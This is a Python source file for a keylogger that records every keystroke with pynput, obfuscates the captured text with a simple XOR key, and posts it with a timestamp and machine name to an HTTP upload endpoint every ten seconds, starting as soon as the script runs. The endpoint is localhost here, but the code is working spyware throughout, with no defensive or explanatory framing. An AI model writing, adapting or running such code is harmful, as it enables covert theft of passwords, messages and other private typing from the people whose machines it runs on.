from datetime import datetime
from flask import jsonify
import requests
import time
import platform
from pynput import keyboard


class IKeylogger:
    def __init__(self):
        self.my_list = []
        self.listener = None

    def on_press(self, key):
        try:
            tempKey = str(key.char)
        except AttributeError:
            if key == keyboard.Key.backspace:
                if self.my_list:
                    self.my_list.pop()
                return
            elif key == keyboard.Key.enter:
                tempKey = '\n'
            elif key == keyboard.Key.space:
                tempKey = ' '
            else:
                tempKey = str(key)
        self.my_list.append(tempKey)

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        self.listener.stop()

    def get_logged_keys(self):
        keys = "".join(self.my_list)
        self.my_list = []
        return keys


class AddToFile:
    def __init__(self):
        self.timestamps = []

    def create_file(self,combined_keys):
        if not combined_keys:
            return None
        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        data = {"machine":"shenaor","logs":{timestamp:combined_keys}}
        return data


    def xor_encrypt(self, text, key):
        return ''.join(f"{ord(c) ^ ord(key[i % len(key)]):02x}"
                       for i, c in enumerate(text))


class NetworkWriter:
    def sendung(self,data):
        url = "http://127.0.0.1:5000/upload"
        requests.post(url,json=data)


class Manager:
    def __init__(self):
        self.keylogger = IKeylogger()
        self.add = AddToFile()
        self.send = NetworkWriter()

    def run(self):
        self.keylogger.start_logging()
        while True:
            time.sleep(10)
            keys = self.keylogger.get_logged_keys()
            data = self.add.xor_encrypt(keys,"0123456789")
            self.send.sendung(self.add.create_file(data))
            if keys == "Key.ctrl_l":
                self.keylogger.stop_logging()
                break



Manager().run()
